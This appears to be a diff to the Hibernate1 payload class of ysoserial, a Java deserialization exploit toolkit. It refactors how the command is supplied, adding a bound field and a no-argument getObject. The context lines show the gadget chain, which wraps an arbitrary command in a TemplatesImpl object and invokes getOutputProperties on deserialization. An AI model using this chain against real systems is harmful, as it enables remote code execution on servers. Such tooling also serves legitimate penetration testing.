@@ -13,6 +13,8 @@ import org.hibernate.type.AbstractType;
 import org.hibernate.type.ComponentType;
 import org.hibernate.type.Type;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
@@ -36,6 +38,8 @@ import ysoserial.payloads.util.Reflections;
  * @author mbechler
  */
 public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
+	
+	@Bind private String command;
 
     public static String[] getDependencies () {
         if ( System.getProperty("hibernate5") != null ) {
@@ -94,7 +98,15 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
     }
 
 
-    public Object getObject ( String command ) throws Exception {
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Object getObject ( String command ) throws Exception {
+		return getObject();
+	}
+
+
+	public Object getObject ( ) throws Exception {
         Object tpl = Gadgets.createTemplatesImpl(command);
         Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
         return makeCaller(tpl, getters);
